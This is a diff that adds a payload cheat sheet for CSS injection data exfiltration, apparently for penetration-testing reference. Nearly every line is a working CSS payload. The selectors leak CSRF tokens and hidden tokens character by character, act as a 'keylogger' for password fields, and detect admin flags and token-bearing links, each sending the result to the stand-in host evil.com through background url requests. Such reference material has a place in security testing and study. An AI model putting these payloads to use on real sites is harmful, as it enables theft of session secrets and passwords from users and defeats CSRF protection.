@@ -1,0 +1,41 @@
+# ============================================================
+# CSS Injection — Data Exfiltration Techniques
+# ============================================================
+
+# ---- Attribute Selector-Based Exfiltration ----
+# Leak CSRF token character by character
+# input[name="csrf"][value^="a"] { background: url(https://evil.com/?v=a) }
+# Automate with: for each charset char at each position
+
+input[name="csrf"][value^="0"] { background: url(https://evil.com/?v=0) }
+input[name="csrf"][value^="1"] { background: url(https://evil.com/?v=1) }
+input[name="csrf"][value^="a"] { background: url(https://evil.com/?v=a) }
+# ... repeat for all possible characters
+
+# ---- Second Character ----
+# After learning first char (e.g., "a"), continue:
+input[name="csrf"][value^="a0"] { background: url(https://evil.com/?v=a0) }
+input[name="csrf"][value^="a1"] { background: url(https://evil.com/?v=a1) }
+
+# ---- Hidden Input Token Leak ----
+input[type="hidden"][name="token"][value^="A"] { background: url(https://evil.com/?t=A) }
+
+# ---- CSS Keylogger (Input Character) ----
+input[type=password][value$="a"] { background: url(https://evil.com/?k=a) }
+input[type=password][value$="b"] { background: url(https://evil.com/?k=b) }
+# Limitation: only works if value attribute updated dynamically in DOM
+
+# ---- Link href Exfiltration ----
+a[href^="https://admin"] { background: url(https://evil.com/?href=admin) }
+a[href*="token="] { background: url(https://evil.com/?found=token) }
+
+# ---- Meta refresh Leak ----
+# If CSS controls redirects
+meta[content*="secret"] { background: url(https://evil.com/?leak) }
+
+# ---- Inline Style Attribute Exfiltration ----
+[style*="display:none"] { background: url(https://evil.com/?hidden) }
+
+# ---- CSS HAS() Selector (modern browsers) ----
+body:has(input[name="admin"][value="true"]) { background: url(https://evil.com/?admin=true) }
+body:has(input[name="role"][value="admin"]) { background: url(https://evil.com/?role=admin) }
